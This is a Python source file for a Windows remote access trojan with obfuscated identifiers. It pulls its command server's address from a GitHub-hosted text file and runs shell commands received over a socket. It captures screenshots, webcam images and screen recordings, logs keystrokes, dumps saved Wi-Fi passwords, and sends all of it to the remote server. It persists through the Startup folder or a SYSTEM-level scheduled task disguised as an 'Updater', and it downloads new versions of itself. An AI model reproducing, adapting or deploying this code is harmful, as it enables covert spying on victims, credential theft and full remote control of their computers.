import urllib.request,subprocess,socket,time,os,json,base64,shutil,re,ctypes
from datetime import datetime
ZFRMBWdxthdpZlVqzyk = ""
IuyfKkyHuKAcMIbACesvCV = ""
OcwWcIPrqcQju = "27.07.26.1"
MkSmluVlWQBwtCwZVEF = True
SUJANWAPlCLv = "!"
NZFxKfQsIBRVB = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
nfqtOWSH = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
CrZvPMVDcMAfuuMgO = ""
def is_elevated():
	try:
		return os.geteuid() == 0
	except AttributeError:
		return ctypes.windll.shell32.IsUserAnAdmin() != 0
STARTUP_PATH = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup") if not is_elevated() else "C:\\ProgramData\\MicrosoftUpdater\\"
fGojFlTkzegpQ = os.path.expanduser("~\\AppData\\Local\\") if not is_elevated() else STARTUP_PATH
try:
	if not os.path.exists(fGojFlTkzegpQ):
		os.mkdir(fGojFlTkzegpQ)
except:
	pass
def apdqreEIy(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def pxJoWWtCAYDpzNWnHjzlPI(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	VeLsdjUJjfmUpVl = data.decode("utf-8").replace("\n","")
	if not VeLsdjUJjfmUpVl.startswith(SUJANWAPlCLv):
		proc = subprocess.run(VeLsdjUJjfmUpVl, shell=True, capture_output=True)
		pTYPRowapMwCFuH = proc.stdout + proc.stderr
		NWtdjQbwxKjPYgwYqeqKG(s, pTYPRowapMwCFuH)
		return
	rosnuWlnQHAjCBLFfzBZzkm = VeLsdjUJjfmUpVl.split(" ")[0][1:]
	args = " ".join(VeLsdjUJjfmUpVl.split()[1:]).split()
	if rosnuWlnQHAjCBLFfzBZzkm == "cd":
		moveDirectory(s, VeLsdjUJjfmUpVl[4:])
	elif rosnuWlnQHAjCBLFfzBZzkm == "screenshot":
		fhRURQntpkpNQpdSIkXoXXq(s)
	elif rosnuWlnQHAjCBLFfzBZzkm == "webcam":
		QrdLXFMxtkiyqUt(s, args)
	elif rosnuWlnQHAjCBLFfzBZzkm == "download":
		ddIvAdVrYLhgWVacEmmPB(s, VeLsdjUJjfmUpVl)
	elif rosnuWlnQHAjCBLFfzBZzkm == "upload":
		lmLrSwPxPHQqegWdOgOLgC(s, VeLsdjUJjfmUpVl)
	elif rosnuWlnQHAjCBLFfzBZzkm == "wifi":
		qDzUqZLWOrmzSPYSGT(s)
	elif rosnuWlnQHAjCBLFfzBZzkm == "screenrecord":
		VTBkdUSrCfDZ(s, args)
	elif rosnuWlnQHAjCBLFfzBZzkm == "update":
		fnMRShJfqp(s)
	elif rosnuWlnQHAjCBLFfzBZzkm == "basename":
		NWtdjQbwxKjPYgwYqeqKG(s, os.path.basename(__file__))
	else:
		NWtdjQbwxKjPYgwYqeqKG(s,"")
def moveDirectory(s, path):
	try:
		os.chdir(path)
		NWtdjQbwxKjPYgwYqeqKG(s,"")
	except:
		NWtdjQbwxKjPYgwYqeqKG(s, "[!] 404")
def ddIvAdVrYLhgWVacEmmPB(s, VeLsdjUJjfmUpVl):
	aYVfmoYeIrYxdituiQhaH = VeLsdjUJjfmUpVl.replace(SUJANWAPlCLv+"download ","").split(",")
	pTYPRowapMwCFuHs = ""
	for f in aYVfmoYeIrYxdituiQhaH:
		pTYPRowapMwCFuHs += QOOFqEvIMskPCfGCBsr(f, "api/file/", { "type":os.path.splitext(f)[1] })
	NWtdjQbwxKjPYgwYqeqKG(s, pTYPRowapMwCFuHs)
def fhRURQntpkpNQpdSIkXoXXq(s):
	from PIL.ImageGrab import grab
	global fGojFlTkzegpQ
	image = grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	MfniqeDVrble = os.path.join(fGojFlTkzegpQ, "ss.jpg")
	image.save(MfniqeDVrble)
	image.close()
	pTYPRowapMwCFuH = QOOFqEvIMskPCfGCBsr(MfniqeDVrble, "api/sscap")
	os.remove(MfniqeDVrble)
	NWtdjQbwxKjPYgwYqeqKG(s, pTYPRowapMwCFuH)
def QrdLXFMxtkiyqUt(s, args):
	from cv2 import VideoCapture, imwrite
	cameraNumber = 0
	fname = "wc.jpg"
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		cam = VideoCapture(cameraNumber)
		_, frame = cam.read()
		imwrite(fGojFlTkzegpQ+fname, frame)
		cam.release()
		r=QOOFqEvIMskPCfGCBsr(fGojFlTkzegpQ+fname,"api/wc")
		os.remove(fGojFlTkzegpQ+fname)
		NWtdjQbwxKjPYgwYqeqKG(s, r)
	except Exception as e:
		NWtdjQbwxKjPYgwYqeqKG(s, "[!] 404: "+str(e))
def VTBkdUSrCfDZ(s, args):
	from imageio import mimsave
	from PIL.ImageGrab import grab
	global fGojFlTkzegpQ
	HfLUztJRdWvhDJDwziUR = 15
	if not args == []:
		try: HfLUztJRdWvhDJDwziUR = int(args[0])
		except: pass
	EQbOBOePB = os.path.expanduser(fGojFlTkzegpQ, "sr.mp4")
	OIttMxz = []
	fps = 11
	numFrames = HfLUztJRdWvhDJDwziUR * fps
	for _ in range(numFrames):
		OIttMxz.append(grab(bbox=None, all_screens=True))
	mimsave(EQbOBOePB, OIttMxz, fps=fps, quality=8)
	r=QOOFqEvIMskPCfGCBsr(EQbOBOePB, "api/screc")
	os.remove(EQbOBOePB)
	NWtdjQbwxKjPYgwYqeqKG(s, r)
def QOOFqEvIMskPCfGCBsr(RagVTizPwmasjqkxZ, FDdIVKt, bkisXjCYgNXdZARBZcj=None):
	from requests import post
	if not os.path.isfile(RagVTizPwmasjqkxZ):
		return "[!] 404: "+RagVTizPwmasjqkxZ+"\n"
	headers = {"user":os.getlogin()}
	if bkisXjCYgNXdZARBZcj is not None:
		headers = {**headers, **bkisXjCYgNXdZARBZcj}
	f = open(RagVTizPwmasjqkxZ, "rb")
	post("http://"+ZFRMBWdxthdpZlVqzyk+":5555/"+FDdIVKt,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def lmLrSwPxPHQqegWdOgOLgC(s, VeLsdjUJjfmUpVl):
	from requests import get
	MYvNIzMEErcu = VeLsdjUJjfmUpVl.split(" ")[-1]
	sJHwPZKuvVQve = VeLsdjUJjfmUpVl.replace(SUJANWAPlCLv+"upload ","").replace(" "+MYvNIzMEErcu,"")
	if os.path.exists(sJHwPZKuvVQve) or os.path.isfile(sJHwPZKuvVQve):
		NWtdjQbwxKjPYgwYqeqKG(s, "[!] 409")
		return
	response = get(f"http://{ZFRMBWdxthdpZlVqzyk}:5555/api/content/{MYvNIzMEErcu}", headers={"auth":"981xyz"})
	if response.status_code != 200:
		NWtdjQbwxKjPYgwYqeqKG(s, "[!] 404")
		return
	with open(sJHwPZKuvVQve, "wb") as f:
		f.write(response.content)
	NWtdjQbwxKjPYgwYqeqKG(s, "[+] 200")
def oykvlLrUrBiAy(JhLGLmgMltveUgiBibjSZ, FDdIVKt):
	from requests import post
	if JhLGLmgMltveUgiBibjSZ.strip() == "":
		return "[!] 204"
	post("http://"+ZFRMBWdxthdpZlVqzyk+":5555/"+FDdIVKt,
		data=JhLGLmgMltveUgiBibjSZ,
		headers={"user":os.getlogin()})
	return "[+] 200"
def fnMRShJfqp(s):
	h, p, v = WewSXBb(True)
	if (v != OcwWcIPrqcQju):
		IjDWfSKvrVBL(v)
		NWtdjQbwxKjPYgwYqeqKG(s, "[+] 200")
	else:
		NWtdjQbwxKjPYgwYqeqKG(s, "[-] 304")
def qDzUqZLWOrmzSPYSGT(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		NWtdjQbwxKjPYgwYqeqKG(s, "[!] 500")
		return
	ZkmgQBy = ""
	for p in profiles:
		try: ZkmgQBy+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: ZkmgQBy+=f"    {p} - N/A"
	NWtdjQbwxKjPYgwYqeqKG(s, ZkmgQBy)
def IjDWfSKvrVBL(taPVxWMUaqkpWQO):
	import sys
	from requests import get
	global MkSmluVlWQBwtCwZVEF, STARTUP_PATH
	name, ext = os.path.splitext(os.path.basename(sys.executable if getattr(sys, "frozen", False) else __file__))
	py = ext.startswith(".py")
	file = f"{name}.{taPVxWMUaqkpWQO}.{'pyw' if py else 'exe'}"
	source = f"file.{'pyw' if py else 'exe'}"
	path = os.path.join(STARTUP_PATH, file)
	if not os.path.isfile(path):
		r = get(nfqtOWSH + source)
		with open(path, "w" if py else "wb") as f:
			f.write(r.text if py else r.content)
		if is_elevated():
			path = f'"{sys.executable}" "{path}"' if py else path
			subprocess.run([ "schtasks", "/create", "/tn", "Updater", "/tr", path, "/sc", "onstart", "/ru", "SYSTEM", "/rl", "highest", "/f"])
	else:
		MkSmluVlWQBwtCwZVEF = False
def WewSXBb(force=False):
	global ZFRMBWdxthdpZlVqzyk, IuyfKkyHuKAcMIbACesvCV
	if force or ZFRMBWdxthdpZlVqzyk == "" or IuyfKkyHuKAcMIbACesvCV == "":
		while True:
			try:
				with urllib.request.urlopen(NZFxKfQsIBRVB) as response:
					data = response.read().decode("utf-8").replace("\n","").split(":")
					ZFRMBWdxthdpZlVqzyk = data[0].strip()
					IuyfKkyHuKAcMIbACesvCV = data[1].strip()
					taPVxWMUaqkpWQO = data[2].strip()
					return ZFRMBWdxthdpZlVqzyk, IuyfKkyHuKAcMIbACesvCV, taPVxWMUaqkpWQO
			except:
				time.sleep(10)
def fKBMYNAO():
	try:
		zCWOzMGMtuIvi = "settings.xpb"
		jXHKWgtijqjYjswWVsuaX = sorted([file for file in os.listdir(fGojFlTkzegpQ) if os.path.isfile(fGojFlTkzegpQ+"\\"+file) and file.endswith(zCWOzMGMtuIvi.split(".")[-1])])
		if zCWOzMGMtuIvi in jXHKWgtijqjYjswWVsuaX:
			jXHKWgtijqjYjswWVsuaX.remove(zCWOzMGMtuIvi)
		nHgSePJcyQldy = os.path.join(fGojFlTkzegpQ,zCWOzMGMtuIvi)
		if len(jXHKWgtijqjYjswWVsuaX) > 0:
			with open(nHgSePJcyQldy, "ab+") as f:
				for file in jXHKWgtijqjYjswWVsuaX:
					temp = os.path.join(fGojFlTkzegpQ,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		QOOFqEvIMskPCfGCBsr(nHgSePJcyQldy, "api/log")
		if os.path.isfile(nHgSePJcyQldy):
			os.remove(nHgSePJcyQldy)
	except:
		pass
def fMMwRXXnVfYldCNc():
	from pynput.keyboard import Listener
	import logging
	logging.basicConfig(filename=(fGojFlTkzegpQ+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def AaZgeyuYfGiIhyezRE(k):
		logging.info(str(k))
	k=Listener(on_press=AaZgeyuYfGiIhyezRE)
	aCfJaMGZRunFKhW = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in aCfJaMGZRunFKhW:
		l.setLevel(logging.CRITICAL)
	k.start()
def NWtdjQbwxKjPYgwYqeqKG(clientSocket, JhLGLmgMltveUgiBibjSZ):
	formattedData = b""
	if type(JhLGLmgMltveUgiBibjSZ) == bytes:
		formattedData += JhLGLmgMltveUgiBibjSZ
	else:
		formattedData += bytes(JhLGLmgMltveUgiBibjSZ, "utf-8")
	formattedData += bytes("\n"+CrZvPMVDcMAfuuMgO+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def NWqfHuTGiJ():
	global CrZvPMVDcMAfuuMgO
	h, p, v = WewSXBb()
	try: fKBMYNAO()
	except: pass
	try:
		if OcwWcIPrqcQju != v:
			IjDWfSKvrVBL(v)
	except: pass
	try:
		if MkSmluVlWQBwtCwZVEF:
			fMMwRXXnVfYldCNc()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	CrZvPMVDcMAfuuMgO = ("(old)"if OcwWcIPrqcQju!=v else "")+"["+OcwWcIPrqcQju+"] "+os.getlogin()+" - "
	while True:
		LthJfzfHIfNiZi=False
		try:
			s=apdqreEIy(h, p)
			NWtdjQbwxKjPYgwYqeqKG(s, "")
			while not LthJfzfHIfNiZi:
				try: LthJfzfHIfNiZi=pxJoWWtCAYDpzNWnHjzlPI(s)
				except Exception as e:
					NWtdjQbwxKjPYgwYqeqKG(s, str(e))
			s.close()
		except:
			pass
		time.sleep(5)
NWqfHuTGiJ()
